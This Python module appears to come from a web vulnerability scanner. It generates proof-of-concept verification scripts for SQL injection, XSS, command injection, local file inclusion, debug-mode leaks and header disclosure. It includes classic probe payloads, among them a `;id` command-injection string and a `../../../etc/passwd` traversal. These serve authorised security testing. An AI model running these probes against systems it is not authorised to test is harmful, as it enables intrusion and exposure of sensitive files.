"""漏洞验证 PoC 模板 — SQLi / XSS / 命令注入 / LFI / 信息泄露等 Web 漏洞验证模板。"""

from __future__ import annotations

from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from typing import Any, Optional


class VerificationStatus(str, Enum):
    PENDING = "pending"
    VERIFIED = "verified"
    REJECTED = "rejected"
    SKIPPED = "skipped"


class VerificationResult(str, Enum):
    VULN_CONFIRMED = "vuln_confirmed"
    SENSITIVE_DATA_EXPOSED = "sensitive_data"
    SECURITY_BYPASS = "security_bypass"
    FALSE_POSITIVE = "false_positive"
    NO_RESPONSE_DIFF = "no_response_diff"
    PARAM_INVALID = "param_invalid"
    NORMAL_RESPONSE = "normal_response"
    TIMEOUT = "timeout"
    ERROR_403_404 = "error_403_404"


@dataclass
class VulnerabilityFinding:
    title: str = ""
    description: str = ""
    severity: str = "medium"
    vuln_type: str = ""
    evidence: str = ""
    cve: str = ""
    poc_script: str = ""

    def model_copy(self) -> VulnerabilityFinding:
        return VulnerabilityFinding(
            title=self.title,
            description=self.description,
            severity=self.severity,
            vuln_type=self.vuln_type,
            evidence=self.evidence,
            cve=self.cve,
            poc_script=self.poc_script,
        )


@dataclass
class VerifiedFinding:
    original_finding: VulnerabilityFinding
    status: VerificationStatus = VerificationStatus.PENDING
    result: Optional[VerificationResult] = None
    poc_code: Optional[str] = None
    poc_output: Optional[str] = None
    poc_executed_at: Optional[str] = None
    verified_description: str = ""
    verified_evidence: str = ""
    verified_severity: str = ""
    rejection_reason: str = ""
    verified_by: str = "verifier_module"
    verified_at: str = field(default_factory=lambda: datetime.now().isoformat())


# PoC 模板 — Web 漏洞驗證用
class PoCGenerator:
    POC_TEMPLATES: dict[str, str] = {
        "sql_injection": """
import requests

target = "{target}"
params = {{
    "id": "{payload}",
}}

try:
    r = requests.get(target, params=params, timeout=10, verify=False)
    text = r.text.lower()

    sql_errors = [
        "sql syntax", "mysql", "sqlite", "postgres", "oracle",
        "sqlstate", "microsoft sql", "odbc", "syntax error",
        "you have an error in your sql", "warning: mysql",
    ]

    for err in sql_errors:
        if err in text:
            print(f"[CONFIRMED] SQL注入漏洞: 检测到SQL错误特征 '{err}'")
            print(f"[INFO] 响应状态码: {{r.status_code}}")
            exit(0)

    baseline_len = {baseline_len}
    if len(r.content) != baseline_len and baseline_len > 0:
        print(f"[POSSIBLE] 响应长度异常: {{len(r.content)}} vs baseline {{baseline_len}}")

    print("[REJECTED] 未检测到SQL注入特征")
except requests.Timeout:
    print("[REJECTED] 请求超时")
except Exception as e:
    print(f"[ERROR] {{e}}")
""",
        "xss": """
import requests

target = "{target}"
payload = "{payload}"

try:
    r = requests.get(target, params={{"q": payload}}, timeout=10, verify=False)

    if payload in r.text:
        print(f"[CONFIRMED] XSS漏洞: payload出现在响应中")
        print(f"[INFO] 响应中包含: {{payload}}")
        exit(0)

    print("[REJECTED] XSS payload未出现在响应中")
except Exception as e:
    print(f"[ERROR] {{e}}")
""",
        "command_injection": """
import requests

target = "{target}"
params = {{
    "cmd": "{payload}",
}}

try:
    r = requests.get(target, params=params, timeout=10, verify=False)
    text = r.text

    cmd_indicators = ["uid=", "gid=", "root:", "/bin/bash", "whoami", "linux"]

    for indicator in cmd_indicators:
        if indicator in text:
            print(f"[CONFIRMED] 命令注入漏洞: 检测到 '{{indicator}}'")
            exit(0)

    print("[REJECTED] 未检测到命令注入特征")
except Exception as e:
    print(f"[ERROR] {{e}}")
""",
        "debug_mode": """
import requests

target = "{target}"

try:
    r_normal = requests.get(target, timeout=10, verify=False)
    len_normal = len(r_normal.content)

    r_debug = requests.get(target + "/?debug=1", timeout=10, verify=False)
    len_debug = len(r_debug.content)

    print(f"[INFO] 正常响应长度: {{len_normal}}")
    print(f"[INFO] debug=1 响应长度: {{len_debug}}")

    if len_debug != len_normal:
        diff = len_debug - len_normal
        print(f"[POSSIBLE] 调试模式响应与正常响应不同，差异: {{diff}} 字节")

        debug_content = r_debug.text.replace(r_normal.text, "")
        if debug_content:
            sensitive_keywords = ["password", "secret", "api_key", "token", "db_", "connection"]
            for kw in sensitive_keywords:
                if kw.lower() in debug_content.lower():
                    print(f"[CONFIRMED] 调试模式泄露敏感信息: 检测到 '{kw}'")
                    exit(0)

        print("[INFO] 调试模式响应有差异但未发现敏感信息泄露，降级为Info")

    if "debug" in r_debug.text.lower() and r_debug.text.lower().count("debug") > r_normal.text.lower().count("debug"):
        print("[POSSIBLE] debug模式包含额外debug信息")

    print("[REJECTED] 调试模式未发现明显敏感信息泄露")
except Exception as e:
    print(f"[ERROR] {{e}}")
""",
        "lfi": """
import requests

target = "{target}"
payload = "{payload}"

try:
    r = requests.get(target, params={{"file": payload}}, timeout=10, verify=False)
    text = r.text.lower()

    lfi_indicators = ["root:", "/bin/bash", "/bin/sh", "[boot loader]", "windows"]

    for indicator in lfi_indicators:
        if indicator in text:
            print(f"[CONFIRMED] LFI漏洞: 检测到 '{{indicator}}'")
            exit(0)

    print("[REJECTED] 未检测到LFI特征")
except Exception as e:
    print(f"[ERROR] {{e}}")
""",
        "sensitive_file": """
import requests

target = "{target}"
path = "{path}"

try:
    r = requests.get(target + path, timeout=10, verify=False)

    if r.status_code == 200 and len(r.content) > 10:
        print(f"[CONFIRMED] 敏感文件可访问: {{path}}")
        print(f"[INFO] 状态码: {{r.status_code}}, 长度: {{len(r.content)}}")

        ct = r.headers.get("content-type", "")
        print(f"[INFO] Content-Type: {{ct}}")

        exit(0)

    print(f"[REJECTED] 文件不可访问或为空: {{r.status_code}}")
except Exception as e:
    print(f"[ERROR] {{e}}")
""",
        "info_disclosure": """
import requests

target = "{target}"

try:
    r = requests.get(target, timeout=10, verify=False)
    headers = {{k.lower(): v.lower() for k, v in r.headers.items()}}

    sensitive_headers = {
        "x-powered-by": "技术栈信息",
        "server": "服务器信息",
        "x-aspnet-version": "ASP.NET版本",
        "x-generator": "生成器信息",
    }

    found = []
    for header, desc in sensitive_headers.items():
        if header in headers:
            found.append(f"{{header}}: {{headers[header][:50]}}")

    if found:
        print(f"[CONFIRMED] 信息泄露: {{len(found)}}个敏感header")
        for f in found:
            print(f"  - {{f}}")
        exit(0)

    print("[INFO] 未发现明显信息泄露")
    print("[REJECTED] 响应头信息泄露 - 配置问题")
except Exception as e:
    print(f"[ERROR] {{e}}")
""",
    }

    @classmethod
    def generate_poc(
        cls,
        finding: VulnerabilityFinding,
        target: str,
        baseline_len: int = 0,
    ) -> str:
        vuln_type = (finding.vuln_type or "").lower().replace(" ", "_")
        template = cls.POC_TEMPLATES.get(vuln_type)

        if not template:
            template = cls._generic_template()

        payload = cls._guess_payload(finding)
        replacements = {
            "{target}": target,
            "{payload}": payload,
            "{baseline_len}": str(baseline_len),
            "{path}": payload,
        }
        for placeholder, value in replacements.items():
            template = template.replace(placeholder, value)
        return template

    @classmethod
    def _generic_template(cls) -> str:
        return """
import requests

target = "{target}"

try:
    print(f"[*] 测试目标: {{target}}")
    r = requests.get(target, timeout=10, verify=False)
    print(f"[*] 响应状态: {{r.status_code}}")
    print(f"[*] 响应长度: {{len(r.content)}}")

    print("[INFO] 使用通用模板，请根据具体漏洞补充验证逻辑")
except Exception as e:
    print(f"[ERROR] {{e}}")
"""

    @classmethod
    def _guess_payload(cls, finding: VulnerabilityFinding) -> str:
        vuln_type = (finding.vuln_type or "").lower()

        payloads = {
            "sql": "1' OR '1'='1",
            "xss": "<script>alert(1)</script>",
            "command": ";id",
            "lfi": "../../../etc/passwd",
        }

        for key, payload in payloads.items():
            if key in vuln_type:
                return payload

        return "test"
